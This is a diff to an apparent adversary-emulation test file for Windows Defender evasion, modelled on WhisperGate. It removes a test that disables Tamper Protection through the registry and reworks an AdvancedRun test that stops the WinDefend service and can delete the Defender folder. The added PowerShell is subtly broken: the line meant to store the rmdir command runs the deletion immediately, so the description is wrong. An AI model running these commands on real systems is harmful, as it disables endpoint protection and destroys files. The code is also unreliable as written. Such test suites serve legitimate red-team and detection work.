@@ -574,23 +574,12 @@ atomic_tests:
       cmd /c #{DefenderControlExe} /E | Out-Null
     name: powershell
     elevation_required: true
-- name: Disable Windows Defender Tamper Protection
-  auto_generated_guid: 5fde6578-9419-46ef-9258-269dc8656c3e
-  description: Disabling Windows Defender tamper protection to allow attacks such as [Process Doppleganging](https://medium.com/cyber-unbound/process-doppelg%C3%A4nging-684bdd6b760f). Tamper Protection will be disabled after the next reboot.
-  supported_platforms:
-  - windows
-  executor:
-    command: |-
-      New-Item -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Feature'
-      New-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Feature' -name 'TamperData' -value 0
-    cleanup_command: Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Feature' -name 'TamperData' -value 1
-    name: powershell
 - name: Disable Defender Using NirSoft AdvancedRun
   description: |
     Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html
     This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
     See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
-    Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, as well as attempt to delete the Defender folder on disk. 
+    Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. 
   supported_platforms:
   - windows
   input_arguments:
@@ -598,10 +587,10 @@ atomic_tests:
       description: Path of Advanced Run executable
       type: Path
       default: '$env:temp\AdvancedRun.exe'
-    CommandToRun:
-      description: The secondary command that AdvancedRun should run
-      type: Path
-      default: rmdir '$env:programdata\Microsoft\Windows Defender' -Recurse
+    delete_defender_folder:
+      description: Set to 1 to also delete the Windows Defender folder
+      type: Integer
+      default: 0
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -614,7 +603,10 @@ atomic_tests:
   executor:
     command: |
       Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
-      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "#{CommandToRun}" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      if(#{delete_defender_folder}){
+        $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
+        Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      }
     cleanup_command: |
       Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
     name: powershell
